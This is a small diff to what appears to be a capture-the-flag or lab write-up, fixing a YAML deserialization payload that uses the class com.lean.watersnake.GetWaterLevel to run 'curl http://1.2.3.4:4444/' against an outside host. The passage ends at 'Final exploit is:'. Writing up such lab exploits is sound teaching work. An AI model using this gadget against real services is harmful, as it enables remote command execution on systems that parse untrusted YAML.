@@ -54,7 +54,7 @@ public class GetWaterLevel {
 
 Hence we can run code with something like:
 ```java
-'!!com.lean.watersnake.GetWaterLevel ["curl http://1.2.3.4:4444/"]
+!!com.lean.watersnake.GetWaterLevel ["curl http://1.2.3.4:4444/"]
 ```
 
 Final exploit is:
